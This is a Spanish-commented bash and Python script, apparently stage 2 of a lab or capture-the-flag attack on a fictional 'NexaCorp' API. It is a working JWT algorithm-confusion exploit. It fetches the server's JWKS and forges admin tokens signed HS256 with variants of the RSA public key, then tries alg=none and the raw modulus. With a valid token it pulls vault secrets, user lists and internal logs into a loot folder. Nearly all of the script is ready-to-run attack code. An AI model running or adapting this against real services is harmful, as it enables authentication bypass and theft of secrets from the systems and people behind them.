#!/usr/bin/env bash
# JWT Algorithm Confusion (RS256 -> HS256 con la pública como secret HMAC)
# La API lo dice literal: "If using HS256: the server verifies with the RSA public key as the HMAC secret"
set -euo pipefail
source "$(dirname "$0")/00_config.sh"

JWKS_FILE="${LOOT_DIR}/jwks.json"
PUBKEY_PEM="${LOOT_DIR}/pubkey.pem"
FORGED_TOKEN_FILE="${LOOT_DIR}/forged_token.txt"

echo "[*] 1) Descargando JWKS..."
curl -s "${API_URL}/.well-known/jwks.json" -o "${JWKS_FILE}"
cat "${JWKS_FILE}" | jq

echo
echo "[*] 2) Exportando pública RSA a PEM..."
python3 - <<PYEOF
import json, base64, os
from cryptography.hazmat.primitives.asymmetric.rsa import RSAPublicNumbers
from cryptography.hazmat.primitives.serialization import Encoding, PublicFormat
from cryptography.hazmat.backends import default_backend

def b64u_decode(s):
    s = s + '=' * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())

with open("${JWKS_FILE}") as f:
    jwks = json.load(f)

key = jwks["keys"][0] if "keys" in jwks else jwks
n = int.from_bytes(b64u_decode(key["n"]), "big")
e = int.from_bytes(b64u_decode(key["e"]), "big")
pub = RSAPublicNumbers(e, n).public_key(default_backend())
pem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)

with open("${PUBKEY_PEM}", "wb") as f:
    f.write(pem)

print(pem.decode())
print(f"[+] PEM guardado en ${PUBKEY_PEM}")
print(f"[+] kid del JWKS: {key.get('kid')}")
PYEOF

echo
echo "[*] 3) Forjando JWTs HS256 con varias variantes de la pública como secret..."
python3 - <<'PYEOF' > "${FORGED_TOKEN_FILE}"
import hmac, hashlib, json, base64, os, time

LOOT = os.environ.get("LOOT_DIR", "/root/nexacorp-loot")
PEM_PATH = os.path.join(LOOT, "pubkey.pem")

with open(PEM_PATH, "rb") as f:
    pem_bytes = f.read()

pem_str = pem_bytes.decode()
pem_no_newline = pem_str.replace("\n", "")
pem_with_trailing = pem_str  # incluye \n final
pem_stripped = pem_str.strip()
pem_no_headers = "".join(l for l in pem_str.split("\n") if not l.startswith("-----") and l)

variants = {
    "pem_full_bytes":      pem_bytes,
    "pem_full_str":        pem_str.encode(),
    "pem_stripped":        pem_stripped.encode(),
    "pem_no_newlines":     pem_no_newline.encode(),
    "pem_only_b64":        pem_no_headers.encode(),
    "pem_b64_decoded":     base64.b64decode(pem_no_headers),
}

now = int(time.time())

# Probar varios "kid" típicos por si el server matchea
kids = [None, "1", "default", "primary", "rsa-key-1"]

for kid in kids:
    header = {"alg": "HS256", "typ": "JWT"}
    if kid:
        header["kid"] = kid
    payloads = [
        # Forjamos un usuario admin
        {"sub": "admin", "email": "admin@nexacorp.local", "role": "admin",
         "permissions": ["admin","read","write","vault:read","vault:write"],
         "iat": now, "exp": now + 3600},
        {"sub": "1", "email": "admin@nexacorp.local", "role": "admin",
         "iat": now, "exp": now + 3600},
        {"id": "admin", "email": "admin@nexacorp.local", "role": "admin",
         "iat": now, "exp": now + 3600},
        {"userId": "admin", "role": "admin", "iat": now, "exp": now + 3600},
    ]

    for variant_name, key in variants.items():
        for payload in payloads:
            h_b64 = base64.urlsafe_b64encode(json.dumps(header, separators=(',',':')).encode()).rstrip(b'=').decode()
            p_b64 = base64.urlsafe_b64encode(json.dumps(payload, separators=(',',':')).encode()).rstrip(b'=').decode()
            signing_input = f"{h_b64}.{p_b64}".encode()
            sig = hmac.new(key, signing_input, hashlib.sha256).digest()
            sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
            token = f"{h_b64}.{p_b64}.{sig_b64}"
            tag = f"{variant_name}|kid={kid}|sub={payload.get('sub') or payload.get('id') or payload.get('userId')}|role={payload.get('role')}"
            print(f"{tag}\t{token}")
PYEOF

echo "[+] Tokens forjados guardados en ${FORGED_TOKEN_FILE}"
echo "    Total variantes: $(wc -l < ${FORGED_TOKEN_FILE})"

echo
echo "[*] 4) Probando cada token forjado contra /api/v2/users/me..."
HIT_FOUND=0
HIT_TOKEN=""
while IFS=$'\t' read -r tag token; do
  resp=$(curl -s -w '\n[code=%{http_code}]' "${API_URL}/api/v2/users/me" -H "Authorization: Bearer ${token}")
  code=$(echo "${resp}" | tail -1 | grep -oE '[0-9]+')
  body=$(echo "${resp}" | head -n -1)
  if [[ "${code}" == "200" ]]; then
    echo
    echo ">>>> HIT <<<<"
    echo "TAG: ${tag}"
    echo "TOKEN: ${token}"
    echo "BODY: ${body}"
    HIT_FOUND=1
    HIT_TOKEN="${token}"
    break
  fi
done < "${FORGED_TOKEN_FILE}"

if [[ "${HIT_FOUND}" -eq 0 ]]; then
  echo "[!] Ningún variante del PEM funcionó. Próximas pruebas:"
  echo "    - alg=none"
  echo "    - inyección en kid"
  echo "    - usar el JWK n directamente como bytes"
  echo
  echo "[*] 5) Probando alg=none..."
  python3 - <<'PYEOF2'
import json, base64, time
header = {"alg":"none","typ":"JWT"}
payload = {"sub":"admin","email":"admin@nexacorp.local","role":"admin","iat":int(time.time()),"exp":int(time.time())+3600}
h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
print(f"{h}.{p}.")
PYEOF2
  NONE_TOKEN=$(python3 -c "
import json,base64,time
h={'alg':'none','typ':'JWT'}
p={'sub':'admin','role':'admin','iat':int(time.time()),'exp':int(time.time())+3600}
print(base64.urlsafe_b64encode(json.dumps(h,separators=(',',':')).encode()).rstrip(b'=').decode()+'.'+base64.urlsafe_b64encode(json.dumps(p,separators=(',',':')).encode()).rstrip(b'=').decode()+'.')")
  curl -s -w '\n[code=%{http_code}]\n' "${API_URL}/api/v2/users/me" -H "Authorization: Bearer ${NONE_TOKEN}"

  echo
  echo "[*] 6) Probando con el modulus n bruto del JWK como secret HMAC..."
  python3 - <<'PYEOF3'
import json, hmac, hashlib, base64, time, os
LOOT = os.environ.get("LOOT_DIR","/root/nexacorp-loot")
with open(os.path.join(LOOT,"jwks.json")) as f:
    jwks = json.load(f)
key = jwks["keys"][0] if "keys" in jwks else jwks
n_bytes = base64.urlsafe_b64decode(key["n"] + '='*(-len(key["n"])%4))

now = int(time.time())
header = {"alg":"HS256","typ":"JWT"}
payload = {"sub":"admin","email":"admin@nexacorp.local","role":"admin","iat":now,"exp":now+3600}
h = base64.urlsafe_b64encode(json.dumps(header,separators=(',',':')).encode()).rstrip(b'=').decode()
p = base64.urlsafe_b64encode(json.dumps(payload,separators=(',',':')).encode()).rstrip(b'=').decode()
sig = hmac.new(n_bytes, f"{h}.{p}".encode(), hashlib.sha256).digest()
sig_b64 = base64.urlsafe_b64encode(sig).rstrip(b'=').decode()
print(f"{h}.{p}.{sig_b64}")
PYEOF3
fi

if [[ "${HIT_FOUND}" -eq 1 ]]; then
  echo
  echo "###############################################"
  echo "# Stage 2 SUCCESS — usando el JWT forjado:"
  echo "# ${HIT_TOKEN}"
  echo "###############################################"
  echo
  echo "[*] Probando endpoints sensibles con el JWT admin..."
  for ep in /api/v2/users/me /api/v2/users /api/vault/critical-secrets /api/v2/reports/generate; do
    echo "=== ${ep} ==="
    curl -s "${API_URL}${ep}" -H "Authorization: Bearer ${HIT_TOKEN}"
    echo
  done

  echo
  echo "[*] internalLogs con JWT admin:"
  curl -s -X POST "${GQL_URL}" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer ${HIT_TOKEN}" \
    -d '{"query":"{ internalLogs me { id email role } users { id email role } vaultSecrets { id key value classification accessLevel } }"}' | jq

  echo "[+] Token forjado guardado para reuso:"
  echo "${HIT_TOKEN}" > "${LOOT_DIR}/admin_token.jwt"
fi
